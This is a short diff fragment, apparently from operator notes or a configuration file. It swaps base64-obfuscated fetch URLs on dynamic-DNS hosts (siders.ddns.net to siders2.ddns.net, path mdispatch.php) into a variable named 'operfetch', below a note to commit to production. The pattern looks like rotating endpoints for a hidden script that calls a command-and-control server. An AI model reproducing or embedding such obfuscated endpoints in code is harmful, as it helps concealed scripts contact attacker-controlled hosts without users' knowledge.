@@ -7,6 +7,11 @@
 *commit to production
 atob("aHR0cDovL3NpZGVycy5kZG5zLm5ldDo2MDc3Ny9tZGlzcGF0Y2gucGhw") = btoa("http://siders.ddns.net:60777/mdispatch.php")
 atob("aHR0cDovL3NpZGVycy5kZG5zLm5ldDo2MDY2Ni9tZGlzcGF0Y2gucGhw") = btoa("http://siders.ddns.net:60666/mdispatch.php")
+siders to siders2:
+var operfetch = atob("aHR0cDovL3NpZGVyczIuZGRucy5uZXQ6NjA3NzcvbWRpc3BhdGNoLnBocA==");
+var operfetch = atob("aHR0cDovL3NpZGVyczIuZGRucy5uZXQ6NjA2NjYvbWRpc3BhdGNoLnBocA==");
+
+
 
 
 *ab
